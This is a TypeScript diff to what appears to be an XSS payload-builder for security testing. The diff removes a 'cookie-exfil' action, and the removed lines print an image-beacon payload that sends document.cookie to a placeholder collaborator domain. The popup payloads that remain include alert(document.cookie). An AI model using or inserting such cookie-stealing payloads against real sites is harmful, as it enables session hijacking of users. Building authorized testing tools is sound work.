@@ -1,4 +1,4 @@
-export type XssActionId = "alert" | "prompt" | "confirm" | "cookie-alert" | "cookie-exfil" | "custom";
+export type XssActionId = "alert" | "prompt" | "confirm" | "cookie-alert" | "custom";
 
 export type XssAction = {
   id: XssActionId;
@@ -6,11 +6,6 @@ export type XssAction = {
   description: string;
   build: (customInput: string) => string;
 };
-
-/** Obvious placeholder the user must swap for their own collaborator/webhook domain before
- *  the exfil payload can actually send anything anywhere. Pre-fills the editable domain field
- *  so it's ready to use as-is or overwrite. */
-export const EXFIL_PLACEHOLDER_DOMAIN = "YOUR-COLLAB-SERVER.example";
 
 export const XSS_ACTIONS: XssAction[] = [
   {
@@ -37,13 +32,6 @@ export const XSS_ACTIONS: XssAction[] = [
     description:
       "Displays the page's cookies in a popup without sending them anywhere — proves cookies are readable/injectable without any network call.",
     build: () => "alert(document.cookie)",
-  },
-  {
-    id: "cookie-exfil",
-    label: "document.cookie (exfiltrate)",
-    description:
-      "Sends the victim's cookies to an external listener via an image beacon. Edit the domain below to your own Burp Collaborator/webhook domain before use — only use against systems you're authorized to test.",
-    build: (domain) => `new Image().src='//${domain || EXFIL_PLACEHOLDER_DOMAIN}/'+encodeURIComponent(document.cookie)`,
   },
   {
     id: "custom",
